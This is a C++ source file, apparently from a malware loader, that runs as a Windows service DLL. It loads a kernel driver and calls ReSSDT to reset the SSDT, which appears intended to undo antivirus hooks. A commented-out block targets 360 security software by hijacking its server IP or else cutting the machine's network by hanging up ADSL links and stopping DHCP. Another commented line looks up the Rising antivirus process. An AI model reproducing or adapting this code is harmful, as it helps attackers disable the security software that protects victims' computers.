// Loader.cpp : Defines the entry point for the DLL application.
//

#include "stdafx.h"
#include "Common.h"
#include "../Public.h"

#include "resetssdt.h"
#include <ras.h>
#pragma comment(lib, "RASAPI32.LIB")

SERVICE_STATUS_HANDLE hServiceStatus;
DWORD	g_dwCurrState;
DWORD	g_dwServiceType;
char	svcname[MAX_PATH];

extern "C" __declspec(dllexport) void ServiceMain(int argc, wchar_t* argv[]);

int TellSCM( DWORD dwState, DWORD dwExitCode, DWORD dwProgress )
{
    SERVICE_STATUS srvStatus;
    srvStatus.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
    srvStatus.dwCurrentState = g_dwCurrState = dwState;
    srvStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    srvStatus.dwWin32ExitCode = dwExitCode;
    srvStatus.dwServiceSpecificExitCode = 0;
    srvStatus.dwCheckPoint = dwProgress;
    srvStatus.dwWaitHint = 1000;
    return SetServiceStatus( hServiceStatus, &srvStatus );
}

void __stdcall ServiceHandler(DWORD    dwControl)
{
    // not really necessary because the service stops quickly
    switch( dwControl )
    {
    case SERVICE_CONTROL_STOP:
        TellSCM( SERVICE_STOP_PENDING, 0, 1 );
        Sleep(100);
        TellSCM( SERVICE_STOPPED, 0, 0 );
        break;
    case SERVICE_CONTROL_PAUSE:
        TellSCM( SERVICE_PAUSE_PENDING, 0, 1 );
        TellSCM( SERVICE_PAUSED, 0, 0 );
        break;
    case SERVICE_CONTROL_CONTINUE:
        TellSCM( SERVICE_CONTINUE_PENDING, 0, 1 );
        TellSCM( SERVICE_RUNNING, 0, 0 );
        break;
    case SERVICE_CONTROL_INTERROGATE:
        TellSCM( g_dwCurrState, 0, 0 );
        break;
    }
}

BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		Common::g_hInstance = (HINSTANCE)hModule;
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

void ServiceMain( int argc, wchar_t* argv[] )
{
	lstrcpyn(svcname, (char*)argv[0], sizeof svcname); //it's should be unicode, but if it's ansi we do it well
    wcstombs(svcname, argv[0], sizeof svcname);
    hServiceStatus = RegisterServiceCtrlHandler(svcname, (LPHANDLER_FUNCTION)ServiceHandler);
    TellSCM( SERVICE_START_PENDING, 0, 1 );
	Sleep(500);
    TellSCM( SERVICE_RUNNING, 0, 0);
//	DWORD Pid_Rs = Common::GetProcessID("RavMonD.exe");
//	MYDATA data;
//	BOOL bDHCP = FALSE;
//	data.ModuleAddress = (ULONG)GetModuleHandle("ntdll.dll");
/*
	if ( Pid_360 != 0 )
	{
		if ( !Common::Stop360("125.39.100.73") )//先尝试IP劫持，失败则断网
		{
			//断开所有ADSL连接
			RASCONN rasCon[10];//最多10个连接，要是再多就TMD成神了
			rasCon[0].dwSize=sizeof(RASCONN);
			DWORD dwSize;
			dwSize=sizeof(RASCONN)*10;
			DWORD dwConNum=0;
			RasEnumConnections(rasCon,&dwSize,&dwConNum);
			for( DWORD i=0; i < dwConNum; i++ )
			{
				DWORD dwRul=::RasHangUp(rasCon[i].hrasconn);
			}
			//针对内网用户则停止DHCP服务
			Common::StopService("DHCP");
			bDHCP = TRUE;
		}
	}
*/
	HANDLE hDriver = LoadDriver(Common::g_hInstance);
	if ( hDriver != INVALID_HANDLE_VALUE )
	{
		ReSSDT(hDriver);
	}
//	if ( bDHCP ) Common::StartService("DHCP");
	Sleep(2000);
	TellSCM( SERVICE_STOPPED, 0, 0);
}

